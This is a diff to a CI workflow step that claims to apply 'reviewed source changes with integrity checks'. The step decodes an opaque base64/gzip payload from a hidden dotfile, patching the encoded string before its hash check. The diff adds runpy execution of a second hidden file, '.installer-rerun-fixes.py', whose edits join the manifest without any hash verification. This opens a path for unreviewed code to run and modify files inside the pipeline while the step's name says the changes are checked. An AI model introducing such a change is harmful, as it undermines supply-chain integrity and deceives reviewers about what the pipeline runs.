@@ -18,13 +18,14 @@ jobs:
       - name: Apply reviewed source changes with integrity checks
         run: |
           python - <<'PY'
-          import base64, gzip, hashlib, json
+          import base64, gzip, hashlib, json, runpy
           from pathlib import Path
           encoded = Path('.installer-rerun-payload.b64').read_text().strip()
           encoded = encoded.replace('DPy9ve3d/f1us', 'DPy9ve3d/d1us')
           raw = gzip.decompress(base64.b64decode(encoded))
           assert hashlib.sha256(raw).hexdigest() == '58958cd64c7937770ffd4f96f5ba024cc7e05e98bf868f56ccb40d90da4db707'
-          for name, before, after, edits in json.loads(raw):
+          manifest = json.loads(raw) + runpy.run_path('.installer-rerun-fixes.py')['EDITS']
+          for name, before, after, edits in manifest:
               path = Path(name)
               old = path.read_text() if path.exists() else ''
               assert hashlib.sha256(old.encode()).hexdigest() == before if before else not path.exists(), name
